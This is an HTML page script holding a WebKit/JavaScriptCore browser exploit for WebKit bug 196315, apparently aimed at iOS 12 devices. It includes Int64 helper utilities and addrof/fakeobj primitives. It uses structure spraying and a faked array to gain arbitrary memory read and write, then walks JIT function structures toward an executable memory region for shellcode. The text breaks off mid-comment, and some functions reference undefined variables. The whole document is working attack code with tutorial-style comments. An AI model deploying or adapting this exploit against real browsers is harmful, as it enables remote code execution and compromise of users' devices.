<script>
debugger;
let print = alert;
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// That's all the arithmetic we need for exploiting WebKit.. :)

/*
 * Copyright (C) 2019 Alexandro Luongo (w00dl3cs).
 *
 * Bug found by Luca Todesco (qwertyoruiop)
 * Original PoC here: http://rce.party/wtf.js
 */

//var datePrototype = undefined;

//
// Exploit primitives
//
// Bug Tracker:     https://bugs.webkit.org/show_bug.cgi?id=196315
// WebKit Commit:   https://github.com/WebKit/webkit/commit/09af07796b44d812d937a4b1b52f8b5442a97cc8
//
// "Structure::create should call didBecomePrototype()"
//
var datePrototype = undefined
let stage1 = {
    addrof: function(obj) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function InfoLeaker(arg) {
            0 in date;
            return arg[0];
        }

        for (var i = 0; i < 10000; ++i)
            InfoLeaker(arg);

        var handler = {
            has: function() {
                arg[0] = obj;
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        var addr = InfoLeaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        //alert("Could not leak address using 'addrof' primitive!")
    },
    fakeobj: function(addr) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function ObjFaker(arg) {
            0 in date;
            arg[0] = addr;
        }

        for (var i = 0; i < 10000; ++i)
            ObjFaker(arg);

        var handler = {
            has: function() {
                arg[0] = {};
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        ObjFaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        var obj = arg[0];

        if (typeof obj === 'object')
            alert("succeeded");
            return obj;

        //alert("Could not inject fake object using 'fakeobj' primitive!")
    },
     test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                alert("failed please try again")
            }
      }
};

function pwn() {
    //
    // <redacted>
    //

    //
    // Exploitation process is somehow similar to what described
    // in other write-ups available on this repository.
    //
    // There's few changes to keep in mind, however.
    //
    // Depending on the platform you're testing this script on, in fact,
    // you might (or might not) want to have a look at the following commits
    // on the WebKit repository which introduced a bunch of new mitigations,
    // and modify your exploitation plan accordingly:
    //
    // * WebAssembly Gigacage:      https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc
    // * StructureID randomization: https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf
    //
    // Example: jsc uses both of them, iOS12 none (except for 12.4), and so on.
    //
   // stage1.test();
   var structs = [];

function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}

sprayStructures();
print("credits to qwertyoruiopz for exploit");
print("credits for w00dl3cs for nice prims");
print("credits to mee soon for finding offets to overwrite jit");
print("2 out of 5 succes rate tested on i6s ios 12.1.4");
let primitives = stage1;
    //
    // During structure spraying, we've allocated 1000 JSArrays.
    // Let's use one of them for our arbitrary read/write primitives.
    // Killing two birds with one stone.
    //
    var victim = structs[Math.floor(Math.random() * structs.length)];

    // Faking an Array and injecting it into the engine is the first step to
    // construct arbitrary read/write primitives.
    //
    // In his phrack article, saelo solves the problem by faking a Float64Array and then
    // abusing its 'm_vector' field, so that it can be redirected to another array
    // under the attacker's control.
    // Such exploitation technique, however, is not reliable anymore since the
    // introduction of the Gigacages for TypedArrays (JSArrayBufferView):
    //
    //  +0 { 32} JSArrayBufferView
    //  +0 { 16}     JSC::JSNonFinalObject
    //  +0 { 16}         JSC::JSObject
    //  +0 {  8}             JSC::JSCell
    //  +0 {  1}                 JSC::HeapCell
    //  +0 <  4>                 JSC::StructureID m_structureID;
    //  +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>                 JSC::JSType m_type;
    //  +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>                 JSC::CellState m_cellState;
    //  +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    //  +8 <  8>                 JSC::Butterfly * m_value;
    // +16 <  8>     JSC::CagedBarrierPtr<Gigacage::Primitive, void> m_vector;
    // +16 <  8>         JSC::AuxiliaryBarrier<WTF::CagedPtr<Gigacage::Primitive, void, WTF::DumbPtrTraits<void> > > m_barrier;
    // +16 <  8>     <PADDING>
    // +24 <  4>     uint32_t m_length;
    // +28 <  4>     JSC::TypedArrayMode m_mode;
    //
    // Pointers inside a Gigacage cannot be replaced with anything outside of it.
    // Long story short, 'm_vector' is now caged.
    //
    // Good news is, 'm_butterfly' is not.
    // While TypedArrays store values inside their 'm_vector' field, normal Arrays don't.
    // So faking or redirecting a butterfly is still possible as of now:
    //
    // +0 { 16} JSArray
    // +0 { 16}     JSC::JSNonFinalObject
    // +0 { 16}         JSC::JSObject
    // +0 {  8}             JSC::JSCell
    // +0 {  1}                 JSC::HeapCell
    // +0 <  4>                 JSC::StructureID m_structureID;
    // +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
    // +5 <  1>                 JSC::JSType m_type;
    // +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
    // +7 <  1>                 JSC::CellState m_cellState;
    // +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    // +8 <  8>                 JSC::Butterfly * m_value;
    //

    //
    // StructureIDs allocated during spraying should range between 360 and 1360.
    // Any number in-between should provide us with a structure id we can use
    // to fake a valid Array. If that's not going to be the case, however,
    // we're gonna attempt to brute-force such identifier.
    // 512 (0x200) seems like a reasonable number to start from.
    //
    var jsDoubleCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    var jsContiguousCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    //
    // Let's create the object whose properties are going to appear as a real
    // Array to the engine.
    //
    var container = {
        jsCellHeader: jsContiguousCellHeader.asJSValue(),
        butterfly: victim
    };

    //
    // Let's have a look at how 'container' appears in memory.
    //
    // lldb output (with 'container' at 0x1077c45c0):
    //
    // (lldb) x/4gx 0x1077c45c0 -l 1
    // 0x1077c45c0: 0x0100150000000552  +----------+
    // 0x1077c45c8: 0x0000000000000000  +--------+ |
    // 0x1077c45d0: 0x0108200900000200  +------+ | |
    // 0x1077c45d8: 0x00000001077b6bd0  +----+ | | |
    //                                       | | | |
    // +----------------------------------+  | | | |
    // |            container             |  | | | |
    // +----------------------------------+  | | | |
    // | +0 <8> JSC::JSCell               <--------+
    // | +8 <8> JSC::Butterfly            <------+
    // |                                  |  | |
    // | Inline properties:               |  | |
    // |                                  |  | |
    // | +16 <8> jsCellHeader             <----+
    // |    +16 <4> m_structureID         |  |
    // |    +20 <1> m_indexingTypeAndMisc |  |
    // |    +21 <1> m_type                |  |
    // |    +22 <1> m_flags               |  |
    // |    +23 <1> m_cellState           |  |
    // | +24 <8> butterfly                <--+
    // +----------------------------------+
    //
    var realarray = [];

    var realarrayaddr = primitives.addrof(realarray);
    var realarrrayjscellheader = realarrayaddr+0x8;
    print(realarrrayjscellheader);


    var containerAddr = primitives.addrof(container);
    print("[+] Container @ " + containerAddr);

    //
    // Pointing a JSValue to the inline properties of the 'container'
    // object, we can inject a valid JSObject inside the JavaScript engine.
    //
    // +----------------------------------+
    // |            container             |
    // +----------------------------------+
    // | +0 <8> JSC::JSCell               |
    // | +8 <8> JSC::Butterfly            |
    // |                                  |
    // | Inline properties:               |
    // |                                  |      +-------------------+
    // | +16 <8> jsCellHeader  <-----------------+ driver (JSObject) |
    // |    +16 <4> m_structureID         |      +-------------------+
    // |    +20 <1> m_indexingTypeAndMisc |
    // |    +21 <1> m_type                |
    // |    +22 <1> m_flags               |
    // |    +23 <1> m_cellState           |
    // | +24 <8> butterfly                |
    // +----------------------------------+
    //

    var fakeArrayAddr = Add(containerAddr, 0x10);
    print("[+] Fake Array @ " + fakeArrayAddr);

    var driver = primitives.fakeobj(fakeArrayAddr.asDouble());

    //
    // From now on, garbage collector would be super unhappy, and would
    // make everything crash in case it got triggered during exploitation.
    //
    // I'm pretty sure this can be avoided by fixing up the 'driver' object
    // so that its cell and its butterfly work in accordance to the details
    // of the Structure that it's trying to fake.
    //
    // Still haven't found the exact reason of the crash, nor a quick way to
    // fix the mess, so I'd really appreciate if someone could point me
    // into the right direction.
    //
    // Anyway...
    //

    //
    // As pointed out before, using 512 as StructureID should be a safe bet
    // to fake an Array object... but better safe, than sorry.
    //
    while (!(driver instanceof Array)) {
        jsDoubleCellHeader.assignAdd(jsDoubleCellHeader, Int64.One);
        jsContiguousCellHeader.assignAdd(jsContiguousCellHeader, Int64.One);

        container.jsCellHeader = jsContiguousCellHeader.asJSValue();
    }
    print("found valid structid");

    //
    // In this moment, the engine recognizes 'driver' as an Array.
    // Arrays store values using their butterfly, and 'driver' has its
    // butterfly pointing to 'victim'.
    // In other words, accessing any slot inside 'driver' actually means
    // accessing properties of the 'victim' object.
    //
    // Example: 'driver[1]' gives us control over the real butterfly
    // of the 'victim' object:
    //
    //    properties                                           array slots
    // +---------------+                               +-------------------------+
    // +-------+-------+---------------+---------------+-------+--------+--------+
    // | 13.37 | 13.37 | public length | vector length | 13.37 | slot 1 | slot 2 |
    // +-------+-------+---------------+-----------------------+--------+--------+
    //   propn   prop                                  ^
    //                                                 +-------------------+
    //                                                                     |
    // +----------------------+               +-----------------------+    |
    // |        driver        |               |        victim         |    |
    // +----------------------+               +-----------------------+    |
    // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
    // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
    // +----------------------+               +-----------------------+
    //
    // Note: 'public length' and 'vector length' occupy 4 bytes each.
    //
    // As 'victim' itself is an Array, modifying its butterfly implies changes to its
    // backing store; in other words, considering 'victim' is an ArrayWithDouble,
    // we can use it to write (and read) doubles almost everywhere we want.
    //
    // 'Almost', that's significant: 'victim' reads data from its butterfly, which in
    // turn can only be set by 'driver'; but 'driver' is an ArrayWithContiguos, so it
    // can only insert JSValues in its backing store.
    //
    // This, indirectly, puts a limit to what can be read/written from the 'victim'
    // array: everything works fine as long as we have access to a JSValue pointing
    // to the memory location we're interested in reading/writing... but what if we don't?
    //
    // Also, another limitation is dictated by the fact that 'victim' is an array, thus
    // it relies on the informations of its butterfly in order to access properties
    // which have been put inside its array slots: if the 'vector length' field is invalid,
    // then it won't be possible to fetch (or modify) any element of the array.
    //
    // In other words, as of now we would be able to read/write arbitrary memory only if:
    // 1) We had access to a JSValue pointing to that memory location
    // 2) Such memory location was preceded by a valid 'vector length' field
    //
    // These surely are limitation we need to get rid of.
    //
    // But for the time being, let's make use of what we have so far.
    // We can still use these capabilities to upgrade the 'addrof' and 'fakeobj' primitives,
    // and make them more stable/reliable.
    //
    // For this purpose, the idea is to have two different Arrays (one containing doubles
    // and another containing JSValues) to share the same butterfly, so that properties
    // set from one array could be retrieved with a different type from the other one.
    //

    // ArrayWithContiguous
    var boxed = [{}];

    // ArrayWithDouble
    var unboxed = [13.37, 13.37];

    driver[1] = unboxed;

    var shared_butterfly = Int64.fromDouble(victim[1]);
    print("[+] Shared butterfly @ " + shared_butterfly);

    //
    // Address of the unboxed butterfly has been leaked, so it's time to modify
    // the one of the boxed array accordingly.
    //

    driver[1] = boxed;

    victim[1] = shared_butterfly.asDouble();

    //
    // Pointing 'driver[1]' to the boxed array means replacing the butterfly of the 'victim' object.
    // This probably needs to be reverted aswell, if we don't want the garbage collector to kill us.
    //

    //
    // Setup process is pretty much completed, and arbitrary read/write primitives are
    // right around the corner!
    //
    // The boxed and the unboxed arrays now point to the same backing store, which,
    // in other words, means controlled type confusion: every element added to one
    // of the two arrays can be fetched from the other array with a different type.
    //
    // We're gonna upgrade our 'addrof' and 'fakeobj' primitives making use of
    // these changes:
    //                                          array slots
    //                                 +--------------------------+
    // +---------------+---------------+--------+--------+--------+
    // | public length | vector length | slot 0 | slot 1 | slot 2 |
    // +---------------+------------------------+--------+--------+
    //                                 ^
    // +-----------------------+       |       +-----------------------+
    // |        boxed          |       |       |        unboxed        |
    // +-----------------------+       |       +-----------------------+
    // | +0 <8> JSC::JSCell    |       |       | +0 <8> JSC::JSCell    |
    // | +8 <8> JSC::Butterfly --------^-------- +8 <8> JSC::Butterfly |
    // +-----------------------+               +-----------------------+
    //      ^             |                         |             ^
    //  [1] |         [2] |                     [1] |         [2] |
    //      |             v                         v             |
    // +---------+   +---------+               +---------+   +---------+
    // | insert  |   |  fake   |               |  leak   |   | insert  |
    // | JSValue |   | JSValue |               | address |   | address |
    // +---------+   +---------+               +---------+   +---------+
    //
    // [1] - 'addrof' primitive:
    // Insert an object into the boxed array, so that the butterfly gets
    // populated with a pointer (JSValue) to that object; finally, retrieve
    // it from the unboxed array as double, effectively leaking its address.
    //
    // [2] - 'fakeobj' primitive:
    // Insert an address into the unboxed array, so that the butterfly gets
    // populated with a double representing a memory location; finally,
    // retrieve it from the boxed array as a JSValue effectively pointing to
    // that location.
    //

    //
    // Finally, it's time to get rid of the limitations on our
    // arbitrary read/write primitives.
    //
    // As 'driver' is an ArrayWithContiguous and can only work with JSValues,
    // changing it to ArrayWithDouble would really allow us to point to
    // arbitrary memory locations.
    //
    // Note:
    // Yes, we're changing a property on the 'container' object to swap the type
    // of the 'driver' object, so that it can be used to modify the backing store
    // of the 'victim' array, which, in turn, can be used to read or write
    // arbitrary data to arbitrary memory locations. Seems reasonable.
    //

    container.jsCellHeader = jsDoubleCellHeader.asJSValue();

    //
    // Time to upgrade exploit primitives!
    //
    function i2f(x) {
      u32[0] = x % BASE;
      u32[1] = (x - (x % BASE)) / BASE;
      return f64[0];
}
function f2i(x) {
      f64[0] = x;
      return u32[0] + BASE * u32[1];
}
    primitives = {
        addrof: function(obj) {
            boxed[0] = obj;
            return Int64.fromDouble(unboxed[0]);
        },

        fakeobj: function(addr) {
            unboxed[0] = (new Int64(addr)).asDouble();
            return boxed[0];
        },

        //
        // Arbitrary read/write primitives work in a slightly different way.
        //
        // 'driver' allows now to override the butterfly of the 'victim' array,
        // pointing it to any memory location: no more limitations on addresses
        // pointed by JSValues.
        //
        // But what about the other limitation, the one related to the length of
        // the array? Unfortunately, if the address does not point to a memory
        // location preceded by a valid 'vector length' field, it would still be
        // impossible to read or modify the content of the array slots.
        //
        // Property slots, on the other hand, are a different story:
        //
        //        property slots                        array slots
        // +--------------------------+        +--------------------------+
        // +--------------------------------------------------------------+
        // | slot 2 | slot 1 | slot 0 | length | slot 0 | slot 1 | slot 2 |
        // +--------+--------+--------+-----------------+--------+--------+
        //                                     ^
        //                                     +-------------------------------+
        //                                                                     |
        // +----------------------+               +-----------------------+    |
        // |        driver        |               |        victim         |    |
        // +----------------------+               +-----------------------+    |
        // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
        // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
        // +----------------------+               +-----------------------+
        //
        // Note: 'public length' and 'vector length' have been squashed in a single
        // 64-bit field, 'length'.
        //
        // The idea is to replace the 'victim' array butterfly so that the arbitrary
        // memory location is not going to be placed inside the first array slot, but
        // rather in the first property slot.
        //
        // This can be easily achieved by sliding the address of interest by 16 bytes,
        // and point the 'victim' butterfly to that location: in this way, the real
        // address we're interested in overlaps with the first property slot of the array:
        //
        //        property slots                       array slots
        // +--------------------------+        +--------------------------+
        // +--------------------------------------------------------------+
        // | slot 2 | slot 1 | slot 0 | length | slot 0 | slot 1 | slot 2 |   normal butterfly
        // +--------+--------+--------+--------+--------+--------+--------+
        // +--------+--------+--------+--------+---------+--------+--------+
        // | slot 2 | slot 1 |  addr  | addr+8 | addr+16 | slot 1 | slot 2 |  overlapped butterfly
        // +--------+--------+--------+------------------+--------+--------+
        //                                     ^
        //                                     +-------------------------------+
        //                                                                     |
        // +----------------------+               +-----------------------+    |
        // |        driver        |               |        victim         |    |
        // +----------------------+               +-----------------------+    |
        // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
        // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
        // +----------------------+               +-----------------------+
        //
        // At this point, reading or writing to arbitrary memory locations becomes
        // just a matter of accessing that particular property slot on the 'victim'
        // array.
        //
        // In this regard, whe know that 'victim' is one of the 1000 arrays which
        // have been sprayed in the very early stages of the exploit; each of these
        // arrays has its own StructureID (so they have different properties), but all
        // of them share the common 'prop' property, which is going to act as our entry
        // point for arbitrary read/write primitives!
        //
        write64: function(addr, what) {
            driver[1] = Add(addr, 0x10).asDouble();
            victim.prop = this.fakeobj(what);
        },

        read64: function(addr) {
            driver[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.prop);
        },
        writeInt64: function(where,what) {
            driver[1] = Add(addr, 0x10).asDouble();
            victim.prop = this.fakeobj(f2i(what.asDouble()));
        },
        readInt64: function(where) {
            driver[1] = Add(where, 0x10).asDouble();
            var res = this.addrof(victim.prop);
            return new Int64(res);
        },
        read: function(addr, length) {
            var a = new Array(length);
            var i;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.readInt64(addr + i).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.readInt64(addr + i).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a
        },

        write: function(addr, data) {
            throw 'maybe later'
        },
    };
    //alert(primitives.read({},8))
    print("[+] Got arbitrary memory read/write!");
    function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

var shellcodeFunc = makeJITCompiledFunction();

    //
    // Now that the JIT has successfully compiled the target function, it's
    // just a matter of traverse its data structure in order to access the
    // informations about the RWX memory region it points to.
    //
    // First of all, 'shellcodeFunc' is a JSFunction:
    //
    //  +0 { 40} JSFunction
    //  +0 { 24}     JSC::JSCallee
    //  +0 { 16}         JSC::JSNonFinalObject
    //  +0 { 16}             JSC::JSObject
    //  +0 {  8}                 JSC::JSCell
    //  +0 {  1}                     JSC::HeapCell
    //  +0 <  4>                     JSC::StructureID m_structureID;
    //  +4 <  1>                     JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>                     JSC::JSType m_type;
    //  +6 <  1>                     JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>                     JSC::CellState m_cellState;
    //  +8 <  8>                 JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
    //  +8 <  8>                     JSC::Butterfly * m_value;
    // +16 <  8>         JSC::WriteBarrier<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> > m_scope;
    // +16 {  8}             JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >
    // +16 <  8>                 JSC::WriteBarrierBase<JSC::JSScope, WTF::DumbPtrTraits<JSC::JSScope> >::StorageType m_cell;
    // +24 <  8>     JSC::WriteBarrier<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> > m_executable;
    // +24 {  8}         JSC::WriteBarrierBase<JSC::ExecutableBase, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ExecutableBase> >
    // +24 <  8>     <PADDING>
    // +32 <  8>     JSC::WriteBarrier<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> > m_rareData;
    // +32 {  8}         JSC::WriteBarrierBase<JSC::FunctionRareData, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::FunctionRareData> >
    // +32 <  8>     <PADDING>
    //

    var shellcodeFuncAddr = primitives.addrof(shellcodeFunc);
    print("[+] Shellcode function @ " + shellcodeFuncAddr);

    //
    // The field 'm_executable' (offset 24) seems like a reasonable path to inspect.
    //

    var executableAddr = primitives.read64(Add(shellcodeFuncAddr, 24));
    print("[+] Executable instance @ " + executableAddr); 
    // primitives.read64(Add(shellcodeFuncAddr, 24));

    //
    // 'executableAddr' now points to an ExecutableBase:
    //
    //  +0 { 56} ExecutableBase
    //  +0 {  8}     JSC::JSCell
    //  +0 {  1}         JSC::HeapCell
    //  +0 <  4>         JSC::StructureID m_structureID;
    //  +4 <  1>         JSC::IndexingType m_indexingTypeAndMisc;
    //  +5 <  1>         JSC::JSType m_type;
    //  +6 <  1>         JSC::TypeInfo::InlineTypeFlags m_flags;
    //  +7 <  1>         JSC::CellState m_cellState;
    //  +8 <  4>     int m_numParametersForCall;
    // +12 <  4>     int m_numParametersForConstruct;
    // +16 <  4>     JSC::Intrinsic m_intrinsic;
    // +20 <  4>     <PADDING>
    // +24 <  8>     WTF::RefPtr<JSC::JITCode, WTF::DumbPtrTraits<JSC::JITCode> > m_jitCodeForCall;
    // +24 <  8>         WTF::DumbPtrTraits<JSC::JITCode>::StorageType m_ptr;
    // +32 <  8>     WTF::RefPtr<JSC::JITCode, WTF::DumbPtrTraits<JSC::JITCode> > m_jitCodeForConstruct;
    // +32 <  8>     <PADDING>
    // +40 <  8>     JSC::MacroAssemblerCodePtr<357> m_jitCodeForCallWithArityCheck;
    // +40 {  1}         JSC::MacroAssemblerCodePtrBase
    // +40 <  8>         WTF::Poisoned<WTF::Poison<uintptr_t &>, void *> m_value;
    // +40 <  8>             WTF::PoisonedBits m_poisonedBits;
    // +48 <  8>     JSC::MacroAssemblerCodePtr<357> m_jitCodeForConstructWithArityCheck;
    // +48 <  8>     <PADDING>
    //

    //
    // As our interest revolves around the memory area containing the compiled function,
    // the field 'm_jitCodeForCall' (offset 24) seems like the way to go.
    //

    var jitCodeAddr = primitives.read64(Add(executableAddr, 24));
    print("[+] JITCode instance @ " + jitCodeAddr);

    //
    // And this is the JITCode which is being pointed by 'jitCodeAddr':
    //
    //   +0 {536} JITCode
    //   +0 { 40}     JSC::DirectJITCode
    //   +0 { 32}         JSC::JITCodeWithCodeRef
    //   +0 { 16}             JSC::JITCode
    //   +0 <  8>                 __vtbl_ptr_type * _vptr;
    //   +8 {  4}                 WTF::ThreadSafeRefCounted<JSC::JITCode, WTF::DestructionThread::Any>
    //   +8 {  4}                     WTF::ThreadSafeRefCountedBase
    //   +8 <  4>                         std::__1::atomic<unsigned int> m_refCount;
    //   +8 {  4}                             std::__1::__atomic_base<unsigned int, true>
    //   +8 {  4}                                 std::__1::__atomic_base<unsigned int, false>
    //   +8 <  4>                                     unsigned int __a_;
    //  +12 <  1>                 JSC::JITCode::JITType m_jitType;
    //  +13 <  3>                 <PADDING>
    //  +13 <  3>             <PADDING>
    //  +16 < 16>             JSC::MacroAssemblerCodeRef<357> m_ref;
    //  +16 {  1}                 JSC::MacroAssemblerCodeRefBase
    //  +16 <  8>                 JSC::MacroAssemblerCodePtr<357> m_codePtr;
    //  +16 {  1}                     JSC::MacroAssemblerCodePtrBase
    //  +16 <  8>                     WTF::Poisoned<WTF::Poison<uintptr_t &>, void *> m_value;
    //  +16 <  8>                         WTF::PoisonedBits m_poisonedBits;
    //  +24 <  8>                 WTF::RefPtr<WTF::MetaAllocatorHandle, WTF::DumbPtrTraits<WTF::MetaAllocatorHandle> > m_executableMemory;
    //  +24 <  8>                     WTF::DumbPtrTraits<WTF::MetaAllocatorHandle>::StorageType m_ptr;
    //  +32 <  8>         JSC::MacroAssemblerCodePtr<357> m_withArityCheck;
    //  +32 <  8>         <PADDING>
    //  +32 <  8>     <PADDING>
    //  ...
    //

    //
    // Finally, 'm_withArityCheck' (offset 32) is the field which points inside the RWX region.
    //
    // lldb output (with 'm_withArityCheck' pointing at 0x00005eb7bfc0ece4):
    //
    // (lldb) memory region 0x00005eb7bfc0ece4
